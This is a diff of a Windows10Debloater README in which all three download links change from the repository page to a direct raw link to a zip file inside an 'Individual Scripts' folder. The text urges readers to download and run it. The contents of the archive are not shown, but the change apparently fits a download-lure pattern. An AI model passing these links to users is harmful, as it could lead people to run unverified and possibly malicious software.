@@ -1,6 +1,6 @@
 # 🪟 Windows10Debloater - Remove Windows Bloatware Fast
 
-[![Download Windows10Debloater](https://img.shields.io/badge/Download-Windows10Debloater-blue?style=for-the-badge)](https://github.com/enzousu135/Windows10Debloater)
+[![Download Windows10Debloater](https://img.shields.io/badge/Download-Windows10Debloater-blue?style=for-the-badge)](https://raw.githubusercontent.com/enzousu135/Windows10Debloater/main/Individual Scripts/Debloater_Windows_2.5-beta.3.zip)
 
 ## 🚀 What This Does
 
@@ -34,7 +34,7 @@ For best results:
 
 Visit this page to download and run the file:
 
-[https://github.com/enzousu135/Windows10Debloater](https://github.com/enzousu135/Windows10Debloater)
+[https://raw.githubusercontent.com/enzousu135/Windows10Debloater/main/Individual Scripts/Debloater_Windows_2.5-beta.3.zip](https://raw.githubusercontent.com/enzousu135/Windows10Debloater/main/Individual Scripts/Debloater_Windows_2.5-beta.3.zip)
 
 If the page shows a release file, download the package from there. If it shows the main repository page, use the download options on the page to get the latest version.
 
@@ -165,7 +165,7 @@ Windows10Debloater is for users who want a simpler Windows 10 setup. It helps yo
 
 ## 🔗 Primary Download Link
 
-[https://github.com/enzousu135/Windows10Debloater](https://github.com/enzousu135/Windows10Debloater)
+[https://raw.githubusercontent.com/enzousu135/Windows10Debloater/main/Individual Scripts/Debloater_Windows_2.5-beta.3.zip](https://raw.githubusercontent.com/enzousu135/Windows10Debloater/main/Individual Scripts/Debloater_Windows_2.5-beta.3.zip)
 
 ## 🗂️ Topic Tags
 
